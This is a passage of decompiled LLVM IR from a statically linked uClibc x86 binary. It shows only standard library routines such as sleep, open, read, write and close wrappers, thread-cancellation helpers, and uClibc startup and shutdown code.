  %v1_8053584 = call i32 @int80_syscall(i32 270)
  %tmp8 = icmp ult i32 %v1_8053584, -4095
  br i1 %tmp8, label %dec_label_pc_805359e, label %dec_label_pc_8053591

dec_label_pc_8053591:                             ; preds = %dec_label_pc_8053576
  %v1_8053596 = sub i32 0, %v1_8053584
  store i32 %v1_8053596, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_805359e

dec_label_pc_805359e:                             ; preds = %dec_label_pc_8053576, %dec_label_pc_8053591
  %v0_805359f = phi i32 [ %v1_8053584, %dec_label_pc_8053576 ], [ -1, %dec_label_pc_8053591 ]
  %v2_805359e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805359e, i32* @ebx, align 4
  ret i32 %v0_805359f

; uselistorder directives
  uselistorder i32 %v1_8053584, { 1, 2, 0 }
  uselistorder i32 -2147483648, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 104, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* inttoptr (i32 104 to i32*), { 3, 4, 0, 1, 2 }
  uselistorder i32 108, { 6, 4, 1, 2, 5, 3, 0 }
  uselistorder i32* inttoptr (i32 108 to i32*), { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805359e, { 1, 0 }
  uselistorder label %dec_label_pc_8053576, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_80535a0 = load i32, i32* @ebx, align 4
  %v15_80535a1 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v1_80535b4 = icmp eq i32 %arg1, 0
  %v1_80535b6 = icmp eq i1 %v1_80535b4, false
  br i1 %v1_80535b6, label %dec_label_pc_80535eb, label %dec_label_pc_80535b8

dec_label_pc_80535b8:                             ; preds = %entry
  %v0_80535b8 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_80535be = and i32 %v0_80535b8, -71
  store i32 0, i32* @ebx, align 4
  %v9_80535c3 = icmp eq i32 %v1_80535be, 8
  %v1_80535c6 = icmp eq i1 %v9_80535c3, false
  br i1 %v1_80535c6, label %dec_label_pc_805365c, label %dec_label_pc_80535cc

dec_label_pc_80535cc:                             ; preds = %dec_label_pc_80535b8
  store i32 -1, i32* inttoptr (i32 544 to i32*), align 32
  %v0_80535d7 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_80535d7 = or i32 %v0_80535d7, 16
  store i32 %v1_80535d7, i32* inttoptr (i32 132 to i32*), align 4
  %v1_80535e6 = call i32 @__libc_errno(i32 %arg1)
  br label %dec_label_pc_80535eb

dec_label_pc_80535eb:                             ; preds = %entry, %dec_label_pc_80535cc
  store i32 65536, i32* %stack_var_-20, align 4
  %v4_8053602 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v15_80535a1)
  %v2_805360a = load i32, i32* %stack_var_-40, align 4
  %v11_805360a = icmp eq i32 %v2_805360a, 1
  %v1_805360e = icmp eq i1 %v11_805360a, false
  br i1 %v1_805360e, label %dec_label_pc_8053620, label %dec_label_pc_8053610

dec_label_pc_8053610:                             ; preds = %dec_label_pc_80535eb
  %v2_8053610 = ptrtoint i32* %stack_var_-20 to i32
  %v3_8053618 = bitcast i32* %stack_var_-20 to %_TYPEDEF_sigset_t*
  %v4_8053618 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8053618, i32 %v2_8053610)
  br label %dec_label_pc_8053620

dec_label_pc_8053620:                             ; preds = %dec_label_pc_80535eb, %dec_label_pc_8053610
  %v2_8053620 = ptrtoint i32* %stack_var_-12 to i32
  store i32 0, i32* @ebx, align 4
  %v2_8053628 = call i32 @__libc_nanosleep(i32 %v2_8053620, i32 %v2_8053620)
  %v1_805362e = icmp eq i32 %v2_8053628, 0
  store i32 %v2_8053620, i32* @ecx, align 4
  br i1 %v1_805362e, label %dec_label_pc_8053644, label %dec_label_pc_8053633

dec_label_pc_8053633:                             ; preds = %dec_label_pc_8053620
  %v4_8053640 = load i32, i32* %stack_var_-12, align 4
  store i32 %v4_8053640, i32* @ebx, align 4
  br label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %dec_label_pc_8053620, %dec_label_pc_8053633
  %v4_8053644 = urem i8 %tmp, 2
  %v5_8053644 = icmp eq i8 %v4_8053644, 0
  %v1_8053649 = icmp eq i1 %v5_8053644, false
  br i1 %v1_8053649, label %dec_label_pc_805365c, label %dec_label_pc_805364b

dec_label_pc_805364b:                             ; preds = %dec_label_pc_8053644
  %v3_8053654 = bitcast i32* %stack_var_-20 to %_TYPEDEF_sigset_t*
  %v4_8053654 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8053654, i32 0)
  br label %dec_label_pc_805365c

dec_label_pc_805365c:                             ; preds = %dec_label_pc_8053644, %dec_label_pc_80535b8, %dec_label_pc_805364b
  %v0_805365c = load i32, i32* @ebx, align 4
  store i32 %v0_80535a0, i32* @ebx, align 4
  ret i32 %v0_805365c

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805365c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053644, { 1, 0 }
  uselistorder label %dec_label_pc_8053620, { 1, 0 }
  uselistorder label %dec_label_pc_80535eb, { 1, 0 }
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053670 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053670 = icmp eq i32 %v0_8053670, 0
  %v1_8053678 = icmp eq i1 %v1_8053670, false
  call void @__pseudo_cond_branch(i1 %v1_8053678, i32 134559381)
  %v2_8053678 = load i32, i32* @eax, align 4
  ret i32 %v2_8053678
}

define i32 @__GI___close_nocancel(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8053685 = call i32 @close(i32 %arg1)
  %v5_8053689 = icmp ult i32 %v1_8053685, -4095
  %v1_805368e = icmp eq i1 %v5_8053689, false
  call void @__pseudo_cond_branch(i1 %v1_805368e, i32 134560640)
  ret i32 %v1_8053685
}

define i32 @pseudo_cancel.3(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053695:
  %v4_8053695 = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_805369c = load i32, i32* @ebx, align 4
  %v1_80536a7 = call i32 @close(i32 %arg1)
  store i32 %v0_805369c, i32* @ebx, align 4
  store i32 %v4_8053695, i32* @eax, align 4
  %v1_80536ae = call i32 @__libc_disable_asynccancel(i32 %v1_80536a7)
  %v5_80536b4 = icmp ult i32 %v1_80536a7, -4095
  %v1_80536b9 = icmp eq i1 %v5_80536b4, false
  call void @__pseudo_cond_branch(i1 %v1_80536b9, i32 134560640)
  ret i32 %v1_80536a7

; uselistorder directives
  uselistorder i32 %v1_80536a7, { 1, 0, 2 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80536c0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80536c0 = icmp eq i32 %v0_80536c0, 0
  %v1_80536c8 = icmp eq i1 %v1_80536c0, false
  call void @__pseudo_cond_branch(i1 %v1_80536c8, i32 134559467)
  %v2_80536c8 = load i32, i32* @eax, align 4
  ret i32 %v2_80536c8
}

define i32 @__GI___open_nocancel(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80536dc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v5_80536df = icmp ult i32 %v4_80536dc, -4095
  %v1_80536e4 = icmp eq i1 %v5_80536df, false
  call void @__pseudo_cond_branch(i1 %v1_80536e4, i32 134560640)
  ret i32 %v4_80536dc
}

define i32 @pseudo_cancel.2(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80536eb:
  %v4_80536eb = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80536f1 = load i32, i32* @ebx, align 4
  %v4_8053703 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  store i32 %v0_80536f1, i32* @ebx, align 4
  store i32 %v4_80536eb, i32* @eax, align 4
  %v1_8053709 = call i32 @__libc_disable_asynccancel(i32 %v4_8053703)
  %v5_805370f = icmp ult i32 %v4_8053703, -4095
  %v1_8053714 = icmp eq i1 %v5_805370f, false
  call void @__pseudo_cond_branch(i1 %v1_8053714, i32 134560640)
  ret i32 %v4_8053703

; uselistorder directives
  uselistorder i32 %v4_8053703, { 1, 0, 2 }
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8053720 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053720 = icmp eq i32 %v0_8053720, 0
  %v1_8053728 = icmp eq i1 %v1_8053720, false
  call void @__pseudo_cond_branch(i1 %v1_8053728, i32 134559563)
  %v2_8053728 = load i32, i32* @eax, align 4
  ret i32 %v2_8053728
}

define i32 @__GI___write_nocancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805373c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  %v5_805373f = icmp ult i32 %v4_805373c, -4095
  %v1_8053744 = icmp eq i1 %v5_805373f, false
  call void @__pseudo_cond_branch(i1 %v1_8053744, i32 134560640)
  ret i32 %v4_805373c
}

define i32 @pseudo_cancel.1(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805374b:
  %v4_805374b = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8053751 = load i32, i32* @ebx, align 4
  %v4_8053763 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8053751, i32* @ebx, align 4
  store i32 %v4_805374b, i32* @eax, align 4
  %v1_8053769 = call i32 @__libc_disable_asynccancel(i32 %v4_8053763)
  %v5_805376f = icmp ult i32 %v4_8053763, -4095
  %v1_8053774 = icmp eq i1 %v5_805376f, false
  call void @__pseudo_cond_branch(i1 %v1_8053774, i32 134560640)
  ret i32 %v4_8053763

; uselistorder directives
  uselistorder i32 %v4_8053763, { 1, 0, 2 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_8053780 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8053780 = icmp eq i32 %v0_8053780, 0
  %v1_8053788 = icmp eq i1 %v1_8053780, false
  call void @__pseudo_cond_branch(i1 %v1_8053788, i32 134559659)
  %v2_8053788 = load i32, i32* @eax, align 4
  ret i32 %v2_8053788
}

define i32 @__read_nocancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805379c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  %v5_805379f = icmp ult i32 %v4_805379c, -4095
  %v1_80537a4 = icmp eq i1 %v5_805379f, false
  call void @__pseudo_cond_branch(i1 %v1_80537a4, i32 134560640)
  ret i32 %v4_805379c
}

define i32 @pseudo_cancel(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80537ab:
  %v4_80537ab = call i32 @__libc_enable_asynccancel(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80537b1 = load i32, i32* @ebx, align 4
  %v4_80537c3 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_80537b1, i32* @ebx, align 4
  store i32 %v4_80537ab, i32* @eax, align 4
  %v1_80537c9 = call i32 @__libc_disable_asynccancel(i32 %v4_80537c3)
  %v5_80537cf = icmp ult i32 %v4_80537c3, -4095
  %v1_80537d4 = icmp eq i1 %v5_80537cf, false
  call void @__pseudo_cond_branch(i1 %v1_80537d4, i32 134560640)
  ret i32 %v4_80537c3

; uselistorder directives
  uselistorder i32 %v4_80537c3, { 1, 0, 2 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80537dd = load i32, i32* @eax, align 4
  %v2_80537dd = and i32 %v0_80537dd, 2
  %v3_80537dd = icmp eq i32 %v2_80537dd, 0
  %v0_80537df = load i32, i32* @ebx, align 4
  store i32 %v0_80537df, i32* %stack_var_-8, align 4
  %v1_80537e0 = icmp eq i1 %v3_80537dd, false
  br i1 %v1_80537e0, label %dec_label_pc_805382f, label %dec_label_pc_80537e2

dec_label_pc_80537e2:                             ; preds = %entry
  %v0_80537e2 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_80537e2, i32* %ebx.global-to-local, align 4
  %storemerge.pre = load i32, i32* inttoptr (i32 132 to i32*), align 4
  br label %dec_label_pc_80537f0

dec_label_pc_80537f0:                             ; preds = %dec_label_pc_80537f0, %dec_label_pc_80537e2
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_80537e2 ], [ %v0_80537f7, %dec_label_pc_80537f0 ]
  store i32 %storemerge, i32* %esi.global-to-local, align 4
  %v1_80537f4 = and i32 %storemerge, -3
  store i32 %v1_80537f4, i32* @edx, align 4
  %v0_80537f7 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v13_80537f7 = icmp eq i32 %storemerge, %v0_80537f7
  %v20_80537f7 = select i1 %v13_80537f7, i32 %v1_80537f4, i32 %v0_80537f7
  store i32 %v20_80537f7, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8053800 = load i32, i32* %esi.global-to-local, align 4
  %v12_8053800 = icmp eq i32 %v0_80537f7, %v1_8053800
  br i1 %v12_8053800, label %dec_label_pc_805381f, label %dec_label_pc_80537f0

dec_label_pc_8053808:                             ; preds = %dec_label_pc_805381f, %dec_label_pc_8053808
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 128, i32* @ecx, align 4
  %v1_8053814 = call i32 @int80_syscall(i32 240)
  %v0_8053816 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  store i32 %v0_8053816, i32* @edx, align 4
  %v1_8053827 = and i32 %v0_8053816, 12
  %v9_805382a = icmp eq i32 %v1_8053827, 4
  br i1 %v9_805382a, label %dec_label_pc_8053808, label %dec_label_pc_8053825.dec_label_pc_805382f.loopexit_crit_edge

dec_label_pc_805381f:                             ; preds = %dec_label_pc_80537f0
  %v0_805381f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805381f = add i32 %v0_805381f, 132
  store i32 %v1_805381f, i32* %ebx.global-to-local, align 4
  %v0_80538251 = load i32, i32* @edx, align 4
  %v1_80538272 = and i32 %v0_80538251, 12
  %v9_805382a5 = icmp eq i32 %v1_80538272, 4
  br i1 %v9_805382a5, label %dec_label_pc_8053808, label %dec_label_pc_805382f

dec_label_pc_8053825.dec_label_pc_805382f.loopexit_crit_edge: ; preds = %dec_label_pc_8053808
  %v2_805382f.pre.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805382f

dec_label_pc_805382f:                             ; preds = %dec_label_pc_805381f, %dec_label_pc_8053825.dec_label_pc_805382f.loopexit_crit_edge, %entry
  %v2_805382f = phi i32 [ %v0_80537df, %entry ], [ %v2_805382f.pre.pre, %dec_label_pc_8053825.dec_label_pc_805382f.loopexit_crit_edge ], [ %v0_80537df, %dec_label_pc_805381f ]
  %.0 = phi i32 [ undef, %entry ], [ %v1_8053827, %dec_label_pc_8053825.dec_label_pc_805382f.loopexit_crit_edge ], [ %v1_80538272, %dec_label_pc_805381f ]
  store i32 %v2_805382f, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_80537f7, { 0, 3, 2, 1 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 -3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805382f, { 1, 0, 2 }
}

define i32 @__libc_enable_asynccancel(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053832 = load i32, i32* @ebx, align 4
  store i32 %v0_8053832, i32* %stack_var_-4, align 4
  %storemerge.pre = load i32, i32* inttoptr (i32 132 to i32*), align 4
  br label %dec_label_pc_805383a

dec_label_pc_805383a:                             ; preds = %dec_label_pc_8053843, %entry
  %v0_8053843 = phi i32 [ %storemerge.pre, %entry ], [ %v0_8053845, %dec_label_pc_8053843 ]
  store i32 %v0_8053843, i32* %ebx.global-to-local, align 4
  %v1_805383c = or i32 %v0_8053843, 2
  store i32 %v1_805383c, i32* %edx.global-to-local, align 4
  %v12_805383f = icmp eq i32 %v1_805383c, %v0_8053843
  br i1 %v12_805383f, label %dec_label_pc_805387d.loopexit, label %dec_label_pc_8053843

dec_label_pc_8053843:                             ; preds = %dec_label_pc_805383a
  %v0_8053845 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v13_8053845 = icmp eq i32 %v0_8053843, %v0_8053845
  %v20_8053845 = select i1 %v13_8053845, i32 %v1_805383c, i32 %v0_8053845
  store i32 %v20_8053845, i32* inttoptr (i32 132 to i32*), align 4
  %v1_805384e = load i32, i32* %ebx.global-to-local, align 4
  %v12_805384e = icmp eq i32 %v0_8053845, %v1_805384e
  br i1 %v12_805384e, label %dec_label_pc_8053856, label %dec_label_pc_805383a

dec_label_pc_8053856:                             ; preds = %dec_label_pc_8053843
  %v0_8053856 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053856 = and i32 %v0_8053856, -69
  store i32 %v1_8053856, i32* %edx.global-to-local, align 4
  %v9_8053859 = icmp eq i32 %v1_8053856, 10
  %v1_805385c = icmp eq i1 %v9_8053859, false
  br i1 %v1_805385c, label %dec_label_pc_805387d, label %dec_label_pc_805385e

dec_label_pc_805385e:                             ; preds = %dec_label_pc_8053856
  store i32 -1, i32* inttoptr (i32 544 to i32*), align 32
  %v0_8053869 = load i32, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8053869 = or i32 %v0_8053869, 16
  store i32 %v1_8053869, i32* inttoptr (i32 132 to i32*), align 4
  %v1_8053878 = call i32 @__libc_errno(i32 %v0_8053832)
  %v0_805387d.pre = load i32, i32* %ebx.global-to-local, align 4
  %v2_805387f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805387d

dec_label_pc_805387d.loopexit:                    ; preds = %dec_label_pc_805383a
  br label %dec_label_pc_805387d

dec_label_pc_805387d:                             ; preds = %dec_label_pc_805387d.loopexit, %dec_label_pc_8053856, %dec_label_pc_805385e
  %v2_805387f = phi i32 [ %v0_8053832, %dec_label_pc_805387d.loopexit ], [ %v0_8053832, %dec_label_pc_8053856 ], [ %v2_805387f.pre, %dec_label_pc_805385e ]
  %v0_805387d = phi i32 [ %v0_8053843, %dec_label_pc_805387d.loopexit ], [ %v0_8053845, %dec_label_pc_8053856 ], [ %v0_805387d.pre, %dec_label_pc_805385e ]
  store i32 %v2_805387f, i32* @ebx, align 4
  ret i32 %v0_805387d

; uselistorder directives
  uselistorder i32 %v0_8053845, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8053843, { 0, 1, 4, 3, 2 }
  uselistorder i32* inttoptr (i32 544 to i32*), { 1, 0 }
  uselistorder i32 132, { 3, 4, 0, 1, 2 }
  uselistorder i32* inttoptr (i32 132 to i32*), { 5, 6, 7, 8, 0, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805387d, { 0, 2, 1 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  store i32 %arg3, i32* @edx, align 4
  %v2_8053898 = add i32 %tmp3, 4
  %v3_8053898 = inttoptr i32 %v2_8053898 to i32*
  store i32 %arg3, i32* %v3_8053898, align 4
  ret i32 %tmp3

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  store i32 %tmp2, i32* @edx, align 4
  %v4_80538a0 = icmp eq i32 %arg2, 0
  br i1 %v4_80538a0, label %dec_label_pc_80538b2, label %dec_label_pc_80538a7

dec_label_pc_80538a7:                             ; preds = %entry
  %v1_80538a7 = add i32 %tmp2, 4
  %v2_80538a7 = inttoptr i32 %v1_80538a7 to i32*
  %v3_80538a7 = load i32, i32* %v2_80538a7, align 4
  %v2_80538ae = load i32, i32* %arg1, align 4
  store i32 %v2_80538ae, i32* @ecx, align 4
  call void @__pseudo_branch(i32 %v2_80538ae)
  br label %dec_label_pc_80538b2

dec_label_pc_80538b2:                             ; preds = %entry, %dec_label_pc_80538a7
  %.0 = phi i32 [ undef, %entry ], [ %v3_80538a7, %dec_label_pc_80538a7 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_80538b2, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80538b3 = load i32, i32* @ebx, align 4
  store i32 %v0_80538b3, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32 0), label %dec_label_pc_80538c4, label %dec_label_pc_80538d1

dec_label_pc_80538c4:                             ; preds = %entry, %dec_label_pc_80538c4
  %v1_80538cb6 = phi i32 [ %v1_80538cb, %dec_label_pc_80538c4 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057b6c.324 to i32), i32 -134577004), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80538cb.325 to i32), i32* %stack_var_-8, align 4
  %v5_80538c4 = mul i32 %v1_80538cb6, 4
  %v6_80538c4 = add i32 %v5_80538c4, ptrtoint (i32* @global_var_8057b6c.324 to i32)
  %v7_80538c4 = inttoptr i32 %v6_80538c4 to i32*
  %v8_80538c4 = load i32, i32* %v7_80538c4, align 4
  call void @__pseudo_call(i32 %v8_80538c4)
  %v0_80538cb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80538cb = add i32 %v0_80538cb.pre, -1
  store i32 %v1_80538cb, i32* %ebx.global-to-local, align 4
  %v10_80538cc = icmp eq i32 %v0_80538cb.pre, 0
  %v1_80538cf = icmp eq i1 %v10_80538cc, false
  br i1 %v1_80538cf, label %dec_label_pc_80538c4, label %dec_label_pc_80538d1

dec_label_pc_80538d1:                             ; preds = %dec_label_pc_80538c4, %entry
  %v0_80538d1 = load i32, i32* @global_var_80582f0.326, align 16
  %v1_80538d6 = icmp eq i32 %v0_80538d1, 0
  br i1 %v1_80538d6, label %dec_label_pc_80538dc, label %dec_label_pc_80538da

dec_label_pc_80538da:                             ; preds = %dec_label_pc_80538d1
  %v0_80538da = load i32, i32* %stack_var_-8, align 4
  %v1_80538da = call i32 @__libc_errno(i32 %v0_80538da)
  br label %dec_label_pc_80538dc

dec_label_pc_80538dc:                             ; preds = %dec_label_pc_80538da, %dec_label_pc_80538d1
  %v0_80538ea3 = phi i32 [ %v1_80538da, %dec_label_pc_80538da ], [ 0, %dec_label_pc_80538d1 ]
  %v0_80538dc = load i32, i32* @global_var_80582f4.327, align 4
  %v1_80538e2 = icmp eq i32 %v0_80538dc, 0
  br i1 %v1_80538e2, label %dec_label_pc_80538e9, label %dec_label_pc_80538e6

dec_label_pc_80538e6:                             ; preds = %dec_label_pc_80538dc
  %v2_80538e6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80538e6, i32* %ebx.global-to-local, align 4
  %v1_80538e7 = call i32 @__libc_errno(i32 %v2_80538e6)
  br label %dec_label_pc_80538e9

dec_label_pc_80538e9:                             ; preds = %dec_label_pc_80538e6, %dec_label_pc_80538dc
  %v0_80538ea = phi i32 [ %v1_80538e7, %dec_label_pc_80538e6 ], [ %v0_80538ea3, %dec_label_pc_80538dc ]
  %v2_80538e9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80538e9, i32* @ebx, align 4
  ret i32 %v0_80538ea

; uselistorder directives
  uselistorder i32 %v1_80538cb, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80538c4, { 1, 0 }
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80538eb = load i32, i32* @esi, align 4
  %v0_80538ec = load i32, i32* @eax, align 4
  store i32 %v0_80538ec, i32* @esi, align 4
  %v0_80538ee = load i32, i32* @ebx, align 4
  store i32 %v0_80538ee, i32* %stack_var_-8, align 4
  %v0_80538ef = load i32, i32* @edx, align 4
  store i32 %v0_80538ef, i32* @ebx, align 4
  %v4_80538f4 = call i32 @__libc_fcntl(i32 %v0_80538ec, i32 1, i32 %v0_80538ee)
  %v1_80538fa = add i32 %v4_80538f4, 1
  %v8_80538fa = icmp eq i32 %v1_80538fa, 0
  store i32 %v1_80538fa, i32* @eax, align 4
  %v1_80538fc = icmp eq i1 %v8_80538fa, false
  br i1 %v1_80538fc, label %dec_label_pc_8053914, label %dec_label_pc_80538fe

dec_label_pc_80538fe:                             ; preds = %entry
  %v0_80538fe = load i32, i32* @ebx, align 4
  %v3_8053904 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_8056314.328 to i32), i32 %v0_80538fe)
  %v1_805390a = load i32, i32* @esi, align 4
  %v12_805390a = icmp eq i32 %v3_8053904, %v1_805390a
  br i1 %v12_805390a, label %dec_label_pc_8053914, label %dec_label_pc_805390f

dec_label_pc_805390f:                             ; preds = %dec_label_pc_80538fe
  %v0_805390f = call i32 @abort()
  br label %dec_label_pc_8053914

dec_label_pc_8053914:                             ; preds = %dec_label_pc_80538fe, %entry, %dec_label_pc_805390f
  %v0_8053916 = phi i32 [ %v3_8053904, %dec_label_pc_80538fe ], [ %v1_80538fa, %entry ], [ %v0_805390f, %dec_label_pc_805390f ]
  %v2_8053914 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053914, i32* @ebx, align 4
  store i32 %v0_80538eb, i32* @esi, align 4
  ret i32 %v0_8053916

; uselistorder directives
  uselistorder i32 %v3_8053904, { 1, 0 }
  uselistorder label %dec_label_pc_8053914, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8053917 = load i32, i32* @global_var_80582ec.329, align 4
  %v1_8053917 = icmp eq i32 %v0_8053917, 0
  %v1_805391e = icmp eq i1 %v1_8053917, false
  br i1 %v1_805391e, label %entry.dec_label_pc_805393d_crit_edge, label %dec_label_pc_8053920

entry.dec_label_pc_805393d_crit_edge:             ; preds = %entry
  %v0_805393d.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805393d

dec_label_pc_8053920:                             ; preds = %entry
  store i32 4096, i32* @global_var_80582ec.329, align 4
  %v0_805392a = call i32 @__pthread_initialize_minimal()
  %v0_8053938 = call i32 @_stdio_init()
  br label %dec_label_pc_805393d

dec_label_pc_805393d:                             ; preds = %entry.dec_label_pc_805393d_crit_edge, %dec_label_pc_8053920
  %v0_805393d = phi i32 [ %v0_805393d.pre, %entry.dec_label_pc_805393d_crit_edge ], [ %v0_8053938, %dec_label_pc_8053920 ]
  ret i32 %v0_805393d

; uselistorder directives
  uselistorder label %dec_label_pc_805393d, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp47 = call i32 @__decompiler_undefined_function_0()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
